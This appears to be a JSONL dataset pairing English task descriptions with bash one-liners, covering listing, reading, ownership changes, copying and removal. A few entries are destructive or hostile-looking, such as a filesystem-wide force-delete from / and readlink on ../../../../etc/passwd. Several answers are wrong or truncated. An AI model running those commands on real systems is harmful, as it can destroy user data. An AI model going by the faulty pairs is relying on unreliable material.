{"input": "Prints number of days in a current month", "answer": "cal $(date +\"%m %Y\") | awk 'NF {DAYS = $NF}; END {print DAYS}'"}
{"input": "Prints number of files with extension \"${EXTENSION}\" in the \"${SEARCHPATH}\" directory", "answer": "echo \"Number files in SEARCH PATH with EXTENSION:\" $(ls -1 \"${SEARCHPATH}\"/*.\"${EXTENSION}\" | wc -l)"}
{"input": "Prints only first ten characters of each string of file $file", "answer": "cat $file | cut -c 1-10"}
{"input": "Prints only unique strings of those stored in variables $COMMANDS and $ALIASES", "answer": "echo \"$COMMANDS\"$'\\n'\"$ALIASES\" | sort -u"}
{"input": "Prints out all the logged-in users along with their group information", "answer": "groups $(who | cut -d' ' -f 1)"}
{"input": "Prints path location of $BASH_SOURCE file", "answer": "echo this dir: `dirname $BASH_SOURCE`"}
{"input": "Prints path to folder that contains target of the symbolic link ../../../../etc/passwd", "answer": "$(dirname $(readlink -e ../../../../etc/passwd))"}
{"input": "Prints path to the folder that contains target of symbolic link ../../../../etc/passwd", "answer": "$(dirname $(readlink -e ../../../../etc/passwd))"}
{"input": "Prints process tree for each process owned by user 'username'", "answer": "ps -aux |  awk '/^username/{print $2}' | xargs pstree"}
{"input": "Prints process tree for the current process with ASCII line drawing characters", "answer": "pstree -A -s $$"}
{"input": "Prints process tree of a process having id $mypid, with command options and process id number", "answer": "pstree -aAp $(ps -ejH | awk -v v1=$mypid '$1==v1 {print $3}')"}
{"input": "Prints process tree of the current process with parent processes", "answer": "pstree -s $$"}
{"input": "Prints process tree of user 'user' processes", "answer": "pstree -p user"}
{"input": "Prints process tree with command line arguments and process id numbers", "answer": "pstree -apl"}
{"input": "Prints process tree with command line arguments of a process having id $PID", "answer": "pstree -a \"$PID\""}
{"input": "Prints processes with 'MDSImporte' in name, cutting off  lines longer than screen width, exiting from less after end of output and saving printed lines on terminal after exit", "answer": "pstree | grep MDSImporte | less -SEX"}
{"input": "Prints random line from file $FILE", "answer": "sort --random-sort $FILE | head -n 1"}
{"input": "Prints real path of the folder containing $0 file", "answer": "$(readlink -f $(dirname \"$0\"))"}
{"input": "Prints running process that has id 'pid' with command line arguments", "answer": "pstree -a pid"}
{"input": "Prints sequentially listing of a current folder and calendar of a current month", "answer": "echo `ls` \"`cal`\""}
{"input": "Prints server name from SOA record for domain yahoo.com", "answer": "dig +noall +answer soa yahoo.com | awk '{sub(/.$/,\"\",$5);print $5}'"}
{"input": "Prints sizes of all top-level folders in a current folder with human-readable format and descending order", "answer": "du -h --max-depth=1 . | sort -n -r"}
{"input": "Prints sorted list of logged in users", "answer": "w -h  | cut -d' ' -f1 | sort | uniq"}
{"input": "Prints strings with MAC address configuration of each network interface in system", "answer": "ifconfig | grep HW"}
{"input": "Prints ten latest modified files within the current directory", "answer": "find . -type f -printf '%T@ %p\\n' | sort -n -r | head -${numl} |  cut -f2- -d\" \" | sed -e 's,^\\./,,' | xargs ls -U -l"}
{"input": "Prints the Nth line of output from 'ls -1'", "answer": "ls -1 | tail -n +N | head -n1"}
{"input": "Prints the absolute directory path of the current script preceded by the string \"dirname/readlink: \"", "answer": "echo \"dirname/readlink: $(dirname $(readlink -f $0))\""}
{"input": "Prints the day of last Friday in a current month", "answer": "cal | awk '$6{date=$6}END{print date}'"}
{"input": "Prints the file path composed from the path where symlink target file is located, and name of the symbolic link itself", "answer": "echo \"$(dirname $(readlink -e $F))/$(basename $F)\""}
{"input": "Prints the length and contents of the longest line in filename", "answer": "cat filename | awk '{print length, $0}'|sort -nr|head -1"}
{"input": "Prints top-ten biggest top-level folders within a 'var' folder", "answer": "sudo du -hDaxd1 /var | sort -h | tail -n10"}
{"input": "Prints top-ten list of most used utilities from history", "answer": "history | awk '{ print $2 }' | sort | uniq -c |sort -rn | head"}
{"input": "Prints top-ten of most used utilities from history", "answer": "history | awk '{print $2}' | awk 'BEGIN {FS=\"|\"}{print $1}' | sort | uniq -c | sort -nr | head"}
{"input": "Prints week day of a 31 day in a current month", "answer": "cal | awk 'NR==2 {split($0,a)} {for (i=1;i<=NF;i++) if ($i==date) print a[i]}' FIELDWIDTHS=\"3 3 3 3 3 3 3 3\" date=31"}
{"input": "Prints what day it was 222 days ago", "answer": "date --date=\"222 days ago\" +\"%d\""}
{"input": "Prints what year it was 222 days ago", "answer": "date --date=\"222 days ago\" +\"%Y\""}
{"input": "Prints year-month-date format for given time", "answer": "date -d \"yesterday 13:00\" '+%Y-%m-%d'"}
{"input": "Prints yesterday's date information", "answer": "date --date yesterday \"+%a %d/%m/%Y\""}
{"input": "Process each file beginning with \"file\" in the current directory as an argument to \"bash script.sh\"", "answer": "find -type f -maxdepth 1 -name 'file*' -print0 | sort -z | xargs -0 bash script.sh"}
{"input": "Processes all files recursively in /var/spool/cron/tabs folder and filters out all strings with '#'", "answer": "grep -v \"#\" -R  /var/spool/cron/tabs"}
{"input": "Prompt the user with a question \"This is the question I want to ask?\" and save \"y\" or \"n\" in variable \"REPLY\" in zsh", "answer": "read REPLY\\?\"This is the question I want to ask?\""}
{"input": "Prompt user to type a list of cron jobs directly at the terminal, then use these replacing previously existing cron jobs", "answer": "crontab"}
{"input": "Push the current directory path to the dirs stack", "answer": "pushd `pwd`"}
{"input": "Push the directory containing the first existing command found in all arguments to the directory stack", "answer": "pushd $(dirname `which $@`)"}
{"input": "Pushes current folder to the directory stack", "answer": "pushd $PWD"}
{"input": "Pushes directory path that saved in $line variable to the dirs stack, expanding symbol '~', if present, as home folder path", "answer": "pushd \"${line/#\\~/$HOME}\";"}
{"input": "Pushes to the dirs stack directory path of the current script, or current directory path if executed from bash shell", "answer": "pushd $(dirname $0)"}
{"input": "Put the absolute directory path to the current script to MY_DIR variable", "answer": "MY_DIR=$(dirname $(readlink -f $0))"}
{"input": "Query SRV records for domain '_kerberos._udp.foo.com'", "answer": "dig -t SRV _kerberos._udp.foo.com"}
{"input": "Query about which keys invoke the named function", "answer": "bind -q complete"}
{"input": "Read 10 bytes from $0 and print them by replacing the set '\\000-\\377' with '#'", "answer": "head -c 10 \"$0\" | tr '\\000-\\377' '#'"}
{"input": "Read a line from an interactive shell's standard input into variable \"message\" without backslash escapes and prompt $'Please Enter a Message:\\n'", "answer": "read -rep $'Please Enter a Message:\\n' message"}
{"input": "Read a line from standard input in an interactive shell into variable \"input\" with prompt \"Do that? [Y,n]\" and suggestion \"Y\"", "answer": "read -e -p \"Do that? [Y,n]\" -i Y input"}
{"input": "Read a line from standard input in an interactive shell with prompt in variable \"myprompt\" interpreted as PS1 is interpreted", "answer": "read -e -p \"${myprompt@P}\""}
{"input": "Read a line from standard input into the first argument (\"$1\") using an interactive shell with prompt \"> \"", "answer": "read -e -p '> ' $1"}
{"input": "Read a line from standard input into variable \"date\" with prompt \"BGC enter something\", and storing typed backslash as backslash symbol", "answer": "read -p 'BGG enter something:' -r data"}
{"input": "Read a line from standard input into variable \"message\" with escaped prompt \"Please Enter a Message: \\n\\b\"", "answer": "read -p \"$(echo -e 'Please Enter a Message: \\n\\b')\" message"}
{"input": "Read a line from standard input into variable \"message\" with escaped prompt \"\\nPlease Enter\\na Message: '\"", "answer": "read -p \"`echo -e '\\nPlease Enter\\na Message: '`\" message"}
{"input": "Read a line from standard input into variable \"message\" with prompt \"Please Enter a Message: \" followed by a newline", "answer": "read -p \"Please Enter a Message: `echo $'\\n> '`\" message"}
{"input": "Read a line from standard input into variable \"message\" with the prompt \"Please Enter a Message: $cr\"", "answer": "read -p \"Please Enter a Message: $cr\" message"}
{"input": "Read a line from standard input with prompt \"Are you sure you wish to continue?\"", "answer": "read -p \"Are you sure you wish to continue?\""}
{"input": "Read a line from standard input with prompt \"Are you sure? [Y/n]\" and save response in variable \"response\"", "answer": "read -r -p \"Are you sure? [Y/n]\" response"}
{"input": "Read a line from standard input with prompt \"Enter your age:\\n\"", "answer": "read -p $'Enter your age:\\n'"}
{"input": "Read a line of standard input in an interactive shell", "answer": "read -e"}
{"input": "Read a line of standard input into variable \"_command\" with the prompt as the current working directory followed by \"$\"", "answer": "read -p \"`pwd -P`\\$ \" _command"}
{"input": "Read a single character from standard input and do not allow backslash to escape characters", "answer": "read -rn1"}
{"input": "Read a single character from standard input into variable \"ans\"", "answer": "read -n1 ans"}
{"input": "Read a single character from standard input into variable \"doit\" with prompt \"Do that? [y,n]\"", "answer": "read -n1 -p \"Do that? [y,n]\" doit"}
{"input": "Read a single character from standard input into variable \"key\" without backslash escapes and using an interactive shell with the prompt $'Are you sure (Y/n) : ' and default value $'Y'", "answer": "read -rp $'Are you sure (Y/n) : ' -ei $'Y' key"}
{"input": "Read a single character from standard input into variable \"key\" without backslash escapes and using the prompt \"Press any key to continue...\"", "answer": "read -n1 -r -p \"Press any key to continue...\" key"}
{"input": "Read a single character from standard input into variable \"key\" without backslash escapes, with a timeout of 5 seconds, and with the prompt \"Press any key in the next five seconds...\"", "answer": "read -t5 -n1 -r -p 'Press any key in the next five seconds...' key"}
{"input": "Read a single character from standard input into variable \"runCommand\" with the prompt \"Pick a letter to run a command [A, B, or C for more info] \"", "answer": "read -n1 -p \"Pick a letter to run a command [A, B, or C for more info] \" runCommand"}
{"input": "Read a single character from standard input with delimeter '' and no echo", "answer": "read -d'' -s -n1"}
{"input": "Read and execute file 'lib/B' that located in the same directory as the current script, will fail if currently running script is not in PATH", "answer": "source \"$( dirname \"$( which \"$0\" )\" )/lib/B\""}
{"input": "Read first column of each row, find all other first columns which have a difference less than 10, and append that comma separated list to the row", "answer": "awk 'FNR==NR { array[$1]++; next } { n = asorti(array,sort); for (i=1; i<=n; i++) if (sort[i] <= $1 + 10 && sort[i] >= $1 - 10 && $1 != sort[i]) line = (line ? line \",\" : line) sort[i]; print $0, line; line = \"\" }' file.txt{,} | column -t"}
{"input": "Read hexadecimal bytes from device \"/dev/midi1\"", "answer": "od -vtx1 /dev/midi1"}
{"input": "Read lookup requests from text file '1.txt' and uses them to fetch TXT records", "answer": "dig TXT -f 1.txt"}
{"input": "Read one character from standard input into variable \"REPLY\"", "answer": "read -n 1 -r"}
{"input": "Read standard input and replace any repeated characters except spaces with a single instance", "answer": "tr -cs '[:space:]'"}
{"input": "Read standard input until a null character is found and save the result in variable \"f2\"", "answer": "read -r -d $'\\0' f2"}
{"input": "Read standard input until a null character is found and save the result in variable \"line\"", "answer": "read -d '' line"}
{"input": "Read the first 10 characters from standard input in an interactive shell into variable \"VAR\"", "answer": "read -n10 -e VAR"}
{"input": "Read the first line of output from \"du -s $i\" into variable \"k\" in ksh", "answer": "du -s $i | read k"}
{"input": "Read the history file $HISTFILE and append the contents to the history list", "answer": "history -r \"$HISTFILE\"     #Alternative: exec bash"}
{"input": "Read the raw input of \"/dev/input/mice\" as hexadecimal bytes with 3 bytes per line", "answer": "cat /dev/input/mice | od -t x1 -w3"}
{"input": "Read two bytes from \"/dev/urandom\" and print them as an unsigned integer", "answer": "od -A n -N 2 -t u2 /dev/urandom"}
{"input": "Read yesterday's date with format \"%a %d/%m/%Y\" into variable \"dt\" in a subshell", "answer": "date --date yesterday \"+%a %d/%m/%Y\" | read dt"}
{"input": "Reads content of bzip2 compressed files and processes it with awk utility", "answer": "bzip2 -dc input1.vcf.bz2 input2.vcf.bz2 | awk 'FNR==NR { array[$1,$2]=$8; next } ($1,$2) in array { print $0 \";\" array[$1,$2] }'"}
{"input": "Receive pattern to search for on the standard input and print only matching part of lines from file 'f.html'", "answer": "cat f.html | grep -o \\"}
{"input": "Records the number of occurences of 'needle' in the array 'haystack' into the variable 'inarray'", "answer": "inarray=$(echo ${haystack[@]} | grep -o \"needle\" | wc -w)"}
{"input": "Recursively add \".jpg\" to all files in the current directory tree", "answer": "find . -type f -exec mv '{}' '{}'.jpg \\;"}
{"input": "Recursively add \".jpg\" to all files without an extension in the directory tree \"/path\"", "answer": "find /path -type f -not -name \"*.*\" -exec mv \"{}\" \"{}\".jpg \\;"}
{"input": "Recursively add read and directory access to all permissions of all files and directories", "answer": "chmod -R a+rX *"}
{"input": "Recursively add read and execute permissions to all files and folders in \"directory\"", "answer": "chmod -R +xr directory"}
{"input": "Recursively add user write permission to all files under \"/path/to/git/repo/objects\"", "answer": "chmod -Rf u+w /path/to/git/repo/objects"}
{"input": "Recursively and forcibly removes $TMP folder with all content", "answer": "rm -fR \"${TMP}/\";"}
{"input": "Recursively archive \"test/a/\" to \"test/dest\" excluding \"test/a/b/c/d\"", "answer": "rsync -nvraL test/a/ test/dest --exclude=/b/c/d"}
{"input": "Recursively change \"/usr/local\" owner to the current user and group to admin", "answer": "sudo chown -R $(whoami):admin /usr/local"}
{"input": "Recursively change owner and group of \"/usr/local/rvm/gems/ruby-2.0.0-p481/\" to the current user", "answer": "sudo chown $(whoami):$(whoami) /usr/local/rvm/gems/ruby-2.0.0-p481/ -R"}
{"input": "Recursively change owner to \"$1\" and group to \"httpd\" of all files in the current directory", "answer": "chown -R $1:httpd *"}
{"input": "Recursively change owner to \"amzadm\" and group to \"root\" of all files in \"/usr/lib/python2.6/site-packages/\"", "answer": "chown amzadm.root -R /usr/lib/python2.6/site-packages/"}
{"input": "Recursively change ownership of \"/usr/lib/node_modules/\" to the current user", "answer": "sudo chown -R $(whoami) /usr/lib/node_modules/"}
{"input": "Recursively change ownership of \"/usr/local\" to the current user", "answer": "sudo chown -R `whoami` /usr/local"}
{"input": "Recursively change ownership of \"/usr/local/lib\" to the current user", "answer": "sudo chown -R `whoami` /usr/local/lib"}
{"input": "Recursively change ownership of \"/usr/local/lib/node_modules\" to the current user", "answer": "sudo chown -R `whoami` /usr/local/lib/node_modules"}
{"input": "Recursively change ownership of \"~/.npm\" to the current user", "answer": "sudo chown -R $(whoami) ~/.npm"}
{"input": "Recursively change the group of all files in \"/var/lib/php/session\" to \"lighttpd\"", "answer": "chown -R :lighttpd /var/lib/php/session"}
{"input": "Recursively change the group ownership to \"laravel\" in \"./bootstrap/cache\"", "answer": "sudo chown -R :laravel ./bootstrap/cache"}
{"input": "Recursively change the group ownership to \"laravel\" in \"./storage\"", "answer": "sudo chown -R :laravel ./storage"}
{"input": "Recursively change the owner and group of \"/home/el/svnworkspace\" and \"775\" to \"your_user_name\"", "answer": "chown -R your_user_name.your_user_name 775 /home/el/svnworkspace"}
{"input": "Recursively change the owner and group of \"/workspace\" and \"775\" to \"your_user_name\"", "answer": "chown -R your_user_name.your_user_name 775 /workspace"}
{"input": "Recursively change the owner and group of \"~/.ssh/\" to \"dev_user\"", "answer": "chown \"dev_user\".\"dev_user\" -R ~/.ssh/"}
{"input": "Recursively change the owner group of \"/var/www\" of to \"www-data\"", "answer": "sudo chown -R www-data:www-data /var/www"}
{"input": "Recursively change the owner of all \"*.txt\" files under \"/mydir\" to \"root\"", "answer": "find /mydir -type f -name \"*.txt\" -execdir chown root {} ';'"}
{"input": "Recursively change the owner of all files in \"~/tmp\" to \"$USER\"", "answer": "sudo chown -R $USER ~/tmp"}
{"input": "Recursively change the owner to \"$USER\" and group to \"$GROUP\" of \"/var/lib/cassandra\"", "answer": "sudo chown -R  $USER:$GROUP /var/lib/cassandra"}
{"input": "Recursively change the owner to \"$USER\" and group to \"$GROUP\" of \"/var/log/cassandra\"", "answer": "sudo chown -R  $USER:$GROUP /var/log/cassandra"}
{"input": "Recursively change the owner to \"${JBOSS_USER}\" of \"$JBOSS_LOG_DIR\"", "answer": "chown -R ${JBOSS_USER}: $JBOSS_LOG_DIR"}
{"input": "Recursively change the ownership of all directories in the current directory excluding \"foo\" to \"Camsoft\"", "answer": "ls -d * | grep -v foo | xargs -d \"\\n\" chown -R Camsoft"}
{"input": "Recursively change the ownership of all files in \"/Users/xxx/Library/Developer/Xcode/Templates\" to \"xxx\"", "answer": "sudo chown -R xxx /Users/xxx/Library/Developer/Xcode/Templates"}
{"input": "Recursively changes group ownership of every folder in a current directory to the name of that folder", "answer": "find . -type d | sed -e 's/^\\.\\///g' -e 's/^\\./avoid/g' | grep -v avoid | awk '{print $1\"\\t\"$1}' | xargs chgrp"}
{"input": "Recursively changes group ownership of everything within current folder to 'git'", "answer": "chgrp -R git ./"}
{"input": "Recursively changes group ownership on every file in the ${WP_ROOT}/wp-content directory to ${WS_GROUP} group", "answer": "find ${WP_ROOT}/wp-content -exec chgrp ${WS_GROUP} {} \\;"}
{"input": "Recursively compress every file in the current directory tree and keep the original file", "answer": "gzip -kr ."}
{"input": "Recursively compresses all files within $2 folder", "answer": "find $2 -type f -exec bzip2 {} \\;"}
{"input": "Recursively copies \"$1\" to \"$2\"", "answer": "cp -R \"$1\" \"$2\""}
{"input": "Recursively copies \"$appname.app\", preserving symlinks as symlinks to the 'Payload' directory", "answer": "cp -Rp \"$appname.app\" Payload/"}
{"input": "Recursively copies 'include/gtest' to '/usr/include', preserving all attributes, and copying symlinks as symlinks, without following in source files", "answer": "sudo cp -a include/gtest /usr/include"}
{"input": "Recursively copies 'src' to 'dest' preserving overwriting the existing files", "answer": "cp -nr src_dir dest_dir"}
{"input": "Recursively copies /mnt/usr/lib to the '/usr/' directory, creating symbolic links on each file instead of real copying them", "answer": "cp -rs /mnt/usr/lib /usr/"}
{"input": "Recursively copies all files in the current directory but ones that names match pattern \"dirToExclude|targetDir\" to the 'targetDir' directory, printing info message on each operation", "answer": "cp -rv `ls -A | grep -vE \"dirToExclude|targetDir\"` targetDir"}
{"input": "Recursively copies all files in the current directory but ones with 'c' in name to the home directory", "answer": "cp -r `ls -A | grep -v \"c\"` $HOME/"}
{"input": "Recursively copies everything from '/source/path/*' to the '/destination/path/', preserving from overwriting existing files, and printing info message on each operation", "answer": "cp -Rvn /source/path/* /destination/path/"}
{"input": "Recursively copies everything from '/zzz/zzz/' to the '/xxx/xxx' overwriting the existing files and answering 'yes' on each request for overwriting", "answer": "yes | cp -rf /zzz/zzz/* /xxx/xxx"}
{"input": "Recursively copies everything under the 'current' folder to the '.hiddendir' folder", "answer": "cp * .hiddendir -R"}
{"input": "Recursively copy \"/path/to/data/myappdata/*.txt\" to \"user@host:/remote/path/to/data/myappdata/\"", "answer": "rsync -rvv /path/to/data/myappdata/*.txt user@host:/remote/path/to/data/myappdata/"}
{"input": "Recursively copy \"dir_a\" to \"dir_b\" and delete any new files in \"dir_b\"", "answer": "rsync -u -r --delete dir_a dir_b"}
{"input": "Recursively copy \"dir_b\" to \"dir_a\" and delete any new files in \"dir_a\"", "answer": "rsync -u -r --delete dir_b dir_a"}
{"input": "Recursively copy \"emptydir\" to \"destination/newdir\"", "answer": "rsync --recursive emptydir/ destination/newdir"}
{"input": "Recursively copy \"old/\" to \"new/\" as a dry run skipping files that have matching checksums and output the name only", "answer": "rsync -rcn --out-format=\"%n\" old/ new/"}
{"input": "Recursively copy \"original_dir\" to \"copy_dir\" preserving file/dir timestamps, displaying progress, and skipping files which match in size, keeps partially transferred files", "answer": "rsync -Prt --size-only original_dir copy_dir"}
{"input": "Recursively copy \"source\", \"dir\", and \"target\" to \"dir\" as a dry run", "answer": "rsync -rvc --delete --size-only --dry-run source dir target dir"}
{"input": "Recursively copy /path/foo on host \"prod\" to local directory \"/home/user/Desktop\", connecting as ssh username corresponding to local username", "answer": "scp -r prod:/path/foo /home/user/Desktop"}
{"input": "Recursively copy all \".txt\" files to \"user@remote.machine:/tmp/newdir/\"", "answer": "rsync -rvv *.txt user@remote.machine:/tmp/newdir/"}
{"input": "Recursively copy all (non-hidden) files and directories in current dir except \"foo\" to location specified by variable \"other\"", "answer": "rsync --recursive --exclude 'foo' * \"$other\""}
{"input": "Recursively copy all directories in \"/path/to/source\" to \"/path/to/dest/\" preserving directory hierarchy", "answer": "find /path/to/source -type d | cpio -pd /path/to/dest/"}
{"input": "Recursively copy all files and directories in \"demo\" excluding \".git\" to \"demo_bkp\"", "answer": "find demo -depth -name .git -prune -o -print0 | cpio -0pdv --quiet demo_bkp"}
{"input": "Recursively copy all files and directories matching \"*ela*L1*TE*\" in localhost's directory /tdggendska10/vig-preview-dmz-prod/docs/sbo/pdf/ to /var/www/html/sbo/2010/teacher/ela/level1 on localhost connecting as ssh user \"dalvarado\", in batch mode (no prompt for passwords) preserving file permissions and timestamps, and without displaying progress information", "answer": "scp -Bpqr /tdggendska10/vig-preview-dmz-prod/docs/sbo/pdf/*ela*L1*TE* dalvarado@localhost:/var/www/html/sbo/2010/teacher/ela/level1"}
{"input": "Recursively copy all files and folders in the current directory excluding \"exclude_pattern\" to \"/to/where/\"", "answer": "rsync -r --verbose --exclude 'exclude_pattern' ./* /to/where/"}
{"input": "Recursively copy all files matching \"*.sh\" in \"$from\" to \"root@$host:/home/tmp/\" compressing data during transmission", "answer": "rsync -zvr --exclude=\"*\" --include=\"*.sh\" --include=\"*/\" \"$from\" root@$host:/home/tmp/"}
{"input": "Recursively copy all files with names ending with .txt from dir_1 to the same location within copy_of_dir_1", "answer": "rsync --recursive --prune-empty-dirs --include=\"*.txt\" --filter=\"-! */\" dir_1 copy_of_dir_1"}
{"input": "Recursively copy all regular files below current directory to directory /tmp on hostname, connecting as ssh user matching current username on local host", "answer": "find . -type f -exec scp {} hostname:/tmp/{} \\;"}
{"input": "Recursively copy directory \"/path/to/data/myappdata\" to \"user@host:/remote/path/to/data/myappdata\"", "answer": "rsync -rvv /path/to/data/myappdata user@host:/remote/path/to/data/myappdata"}
{"input": "Recursively copy directory \"/path/to/data/myappdata\" to \"user@host:/remote/path/to/data/newdirname\"", "answer": "rsync -rvv --recursive /path/to/data/myappdata user@host:/remote/path/to/data/newdirname"}
{"input": "Recursively copy directory or file /something on host \"myServer\" to current directory on local host, connecting as ssh user matching username on local host", "answer": "scp -r myServer:/something"}
{"input": "Recursively copy everything in /source/path whose name doesn't begin with a period, to /destination/path, without overwriting existing files, and outputting a line for each file copied or skipped", "answer": "cp -Rvn /source/path/* /destination/path/"}
{"input": "Recursively counts non-blank lines in all files in a current folder, that match regex '\\.php|\\.as|\\.sql|\\.css|\\.js', but skip folders './pma', './blog', './punbb', './js/3rdparty' and files like '*.svn'", "answer": "find . -path './pma' -prune -o -path './blog' -prune -o -path './punbb' -prune -o -path './js/3rdparty' -prune -o -print | egrep '\\.php|\\.as|\\.sql|\\.css|\\.js' | grep -v '\\.svn' | xargs cat | sed '/^\\s*$/d' | wc -l"}
{"input": "Recursively counts non-blank, non-comment lines in all *.c files in a current folder", "answer": "find . -type f -name '*.c' -exec cat {} \\; | sed '/^\\s*#/d;/^\\s*$/d;/^\\s*\\/\\//d' | wc -l"}
{"input": "Recursively from current folder searches only files that names match \".*xxx\" pattern, ignores binary files and prints file name before every string that contains \"my Text to grep\"", "answer": "grep --include=\"*.xxx\" -nRHI \"my Text to grep\" *"}
{"input": "Recursively list all files and directories in \"coreutils-8.9\" with \"DIR: \" prepending directory names", "answer": "tree -F coreutils-8.9 | sed -r 's|\u2500\u2500 (.*)/$|\u2500\u2500 DIR: \\1|'"}
{"input": "Recursively lists all *.py and *.html files in a current folder", "answer": "ls **/*.py **/*.html"}
{"input": "Recursively lists all files in a current folder in long format", "answer": "ls -ld $(find .)"}
{"input": "Recursively move all files in \"/path/to/srcdir\" to \"dest/\"", "answer": "find /path/to/srcdir -type f -print0 | xargs -0 -i% mv % dest/"}
{"input": "Recursively print all files and directories in the directory tree \"$absolute/path/of/your/dir\"", "answer": "tree $absolute/path/of/your/dir"}
{"input": "Recursively prints .txt files in current directory", "answer": "find $(pwd) -name \\*.txt -print"}
{"input": "Recursively prints paths to all text file in folder (ignores binary files)", "answer": "grep -RIl \"\" ."}
{"input": "Reformat date \"Sat Aug 09 13:37:14 2014 +1100\" according to format string \"%a %b %d %H:%M:%S %Y %z\"", "answer": "date -j -f \"%a %b %d %H:%M:%S %Y %z\" \"Sat Aug 09 13:37:14 2014 +1100\""}
{"input": "Remount \"/dev/block/mtdblock3\" on \"/system\" with read and write permission", "answer": "mount -o remount,rw -t yaffs2 /dev/block/mtdblock3 /system"}
{"input": "Remount \"/dev/sda7\" partition as executable", "answer": "sudo mount -o remount -o exec /dev/sda7"}
{"input": "Remount \"/home/evgeny\" with the \"suid\" flag set", "answer": "sudo mount -i -o remount,suid /home/evgeny"}
{"input": "Remount \"/mnt/mountpoint\" with read and write permission", "answer": "mount /mnt/mountpoint -oremount,rw"}
{"input": "Remount \"extX\" filesystem \"/dev/hdaX\" on \"/\" without writing in \"/etc/mtab\"", "answer": "mount -n -o remount -t extX /dev/hdaX /"}
{"input": "Remount \"rfs\" filesystem \"/dev/stl12\" on \"/system\" with read and write permission", "answer": "mount -o rw,remount -t rfs /dev/stl12 /system"}
{"input": "Remount \"yaffs2\" filesystem \"/dev/block/mtdblk4\" to \"/system\" as read and write only", "answer": "mount -o rw,remount -t yaffs2 /dev/block/mtdblk4 /system"}
{"input": "Remount \"yaffs2\" filesystem \"/dev/block/mtdblk4\" to \"/system\" as read only", "answer": "mount -o ro,remount -t yaffs2 /dev/block/mtdblk4 /system"}
{"input": "Remount root filesystem \"/\"", "answer": "mount -oremount /"}
{"input": "Remount subtree \"/outside\" to \"/inside\" as a bind", "answer": "mount /outside /inside -o bind"}
{"input": "Remount the root file system with read and write permission", "answer": "mount -o rw,remount -t rootfs /"}
{"input": "Remove \"-\" from the contents of \"/proc/sys/kernel/random/uuid\" and save output to variable \"comment\"", "answer": "comment=$(cat /proc/sys/kernel/random/uuid | sed 's/\\-//g')"}
{"input": "Remove \"\\n\" from \"test1\\ntest2\\ntest3\" and search for \"test1.*test3\"", "answer": "echo -e \"test1\\ntest2\\ntest3\" |tr -d '\\n' |grep \"test1.*test3\""}
{"input": "Remove \"_dbg\" from all file or directory names under the current directory", "answer": "rename _dbg.txt .txt **/*dbg*"}
{"input": "Remove Mac OS X Desktop Services Store files", "answer": "find . -name \".DS_Store\" -exec rm {} \\;"}
{"input": "Remove `core' files whose status was changed more than 4 days ago", "answer": "find `pwd` -name core -ctime +4 -execdir /bin/rm -f {} \\;"}
{"input": "Remove adjascent duplicate lines from file 'input' comparing all but last space-separated fields", "answer": "rev input | uniq -f1 | rev"}
{"input": "Remove any file containing string \"GUI\"", "answer": "find / -type f -print0 | xargs -0 grep -liwZ GUI | xargs -0 rm -f"}
{"input": "Remove blank lines and replace \" \" with \"/\" in \"struct.txt\" as input to make directories with parents as needed", "answer": "sed '/^$/d;s/ /\\//g' struct.txt | xargs mkdir -p"}
{"input": "Remove containing directories and suffix \".wiki\" from specified path, output the result", "answer": "basename /home/jsmith/base.wiki .wiki"}
{"input": "Remove containing directories from variable 'path' ie. \"/some/specific/directory\" becomes \"directory\"", "answer": "path=$(basename $path)"}
{"input": "Remove directories in /media/1Tb/videos modified more than 7 days ago", "answer": "find /media/1Tb/videos -maxdepth 1 -type d -mtime +7 -exec rm -rf {} \\;"}
{"input": "Remove duplicate lines in \"file_name\" and print the output on stdout", "answer": "awk '{print(NR\"\\t\"$0)}' file_name | sort -t$'\\t' -k2,2 | uniq --skip-fields 1 | sort -k1,1 -t$'\\t' | cut -f2 -d$'\\t'"}
{"input": "Remove duplicate phrases and keep the original order of lines in \"$infile\"", "answer": "nl -w 8 \"$infile\" | sort -k2 -u | sort -n | cut -f2"}
{"input": "Remove duplicates in variable \"variable\" and preserve the order", "answer": "variable=$(echo \"$variable\" | tr ' ' '\\n' | nl | sort -u -k2 | sort -n | cut -f2-)"}
{"input": "Remove each unique item listed on standard input and do nothing if empty", "answer": "sort | uniq -u | xargs -r rm"}
{"input": "Remove empty directories", "answer": "find -type d -exec rmdir --ignore-fail-on-non-empty {} + ;"}
{"input": "Remove empty directories from the current directory tree", "answer": "find . -depth -empty -type d -delete"}
{"input": "Remove empty folder, and skip error message if one is not empty", "answer": "rmdir --ignore-fail-on-non-empty newBaseDir/Data/NewDataCopy"}
{"input": "Remove file with inode number 31246", "answer": "find . -inum 31246 -exec rm [] ';'"}
{"input": "Remove filetype suffix (last dot and following characters if any) from filename", "answer": "echo $filename | rev | cut -f 2- -d '.' | rev"}
{"input": "Remove from the current directory tree all the regular files which have a dot in their names and contain string \"<img-name>-<width:integer>x<height:integer>.<file-ext> syntax\"", "answer": "find . -name \"*.*\" -type f -exec grep -l '<img-name>-<width:integer>x<height:integer>.<file-ext> syntax' {} \\; | xargs rm -f"}
{"input": "Remove gitlab.site.org from root's known hosts file", "answer": "ssh-keygen -f \"/root/.ssh/known_hosts\" -R gitlab.site.org"}
{"input": "Remove last two underscore-delimited fields and following characters in \"t1_t2_t3_tn1_tn2.sh\" keeping only \"t1_t2_t3\"", "answer": "echo t1_t2_t3_tn1_tn2.sh | rev | cut -d_ -f3- | rev"}
{"input": "Remove lines matching \"kpt#\" from \"data.txt\" and add left-justified line numbers", "answer": "grep -v 'kpt#' data.txt | nl -nln"}
{"input": "Remove recursively Emacs backup files in the current directory", "answer": "find . -name '*~' -print0 | xargs -0 rm"}
{"input": "Remove sequence like '\\xEF\\xBB\\xBF' from first string of every '*.js' file in a current folder and subfolders, creating backup file with .bak extension for every changed file, and removing backup on success", "answer": "find . -iname *.js -type f -exec sed 's/^\\xEF\\xBB\\xBF//' -i.bak {} \\; -exec rm {}.bak \\;"}
{"input": "Remove sequence like '\\xEF\\xBB\\xBF' from first string of every file in a current folder and subfolders, creating backup file with .bak extension for every changed file, and removing backup on success", "answer": "find . -type f -exec sed '1s/^\\xEF\\xBB\\xBF//' -i.bak {} \\; -exec rm {}.bak \\;"}
{"input": "Remove sess_* files that were modified more than 2 days ago", "answer": "find sess_* -mtime +2 -exec rm {} \\;"}
{"input": "Remove symbolic links and get absolute path of \"${the_stuff_you_test}\" and save to variable \"DIR_PATH\"", "answer": "DIR_PATH=`readlink -f \"${the_stuff_you_test}\"`"}
{"input": "Remove the \"123_\" prefix from all filenames of .txt files in current directory", "answer": "find -name \"123*.txt\" -exec rename 's/^123_//' {} \";\""}
